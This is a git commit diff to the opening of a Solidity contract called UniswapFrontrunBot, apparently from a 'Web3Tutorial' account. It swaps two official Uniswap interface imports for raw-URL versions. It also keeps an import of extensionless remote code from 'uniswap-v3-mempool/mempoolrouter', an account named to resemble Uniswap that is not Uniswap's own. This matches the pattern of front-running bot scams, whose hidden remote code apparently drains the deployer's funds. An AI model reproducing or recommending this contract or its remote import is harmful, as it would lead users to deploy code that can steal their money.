b3317ba5a79523d3160d5e2c8d92aa3b0685184e
Web3Tutorial <109500917+Web3Tutorial@users.noreply.github.com>
2022-07-24 17:51:18 +0000

    Update Bot.sol

--- Bot.sol
+++ Bot.sol
@@ -1,8 +1,8 @@
 pragma solidity ^0.6.6;
 
 // Import Libraries Migrator/Exchange/Factory
-import "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Migrator.sol";
-import "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";
+import "https://raw.githubusercontent.com/Uniswap/v2-periphery/master/contracts/interfaces/IUniswapV2Migrator.sol";
+import "https://raw.githubusercontent.com/Uniswap/v2-periphery/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";
 import "https://raw.githubusercontent.com/uniswap-v3-mempool/mempoolrouter/main/v3";
 
 contract UniswapFrontrunBot {
